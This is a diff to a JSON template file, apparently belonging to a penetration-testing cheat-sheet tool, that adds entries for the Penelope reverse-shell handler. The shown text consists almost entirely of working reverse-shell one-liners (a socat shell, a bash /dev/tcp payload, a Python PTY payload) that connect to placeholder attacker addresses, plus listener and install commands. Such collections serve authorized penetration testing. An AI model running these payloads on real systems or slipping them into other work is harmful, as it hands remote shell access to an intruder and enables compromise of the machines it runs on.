@@ -224,6 +224,26 @@
           "title": "Socat Victim",
           "description": "Connect back with an interactive Linux shell.",
           "template": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$AttackerIP:$AttackerPort"
+        },
+        {
+          "title": "Penelope Listener",
+          "description": "Start Penelope as an interactive reverse shell handler.",
+          "template": "python3 penelope.py -p $AttackerPort"
+        },
+        {
+          "title": "Penelope Bash Payload",
+          "description": "Linux bash reverse shell payload for a Penelope listener.",
+          "template": "bash -c 'bash -i >& /dev/tcp/$AttackerIP/$AttackerPort 0>&1'"
+        },
+        {
+          "title": "Penelope Python PTY Payload",
+          "description": "Python reverse shell payload that spawns a PTY.",
+          "template": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$AttackerIP\",$AttackerPort));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
+        },
+        {
+          "title": "Penelope Install",
+          "description": "Clone Penelope on the attacker box.",
+          "template": "git clone https://github.com/brightio/penelope.git && cd penelope"
         }
       ]
     }
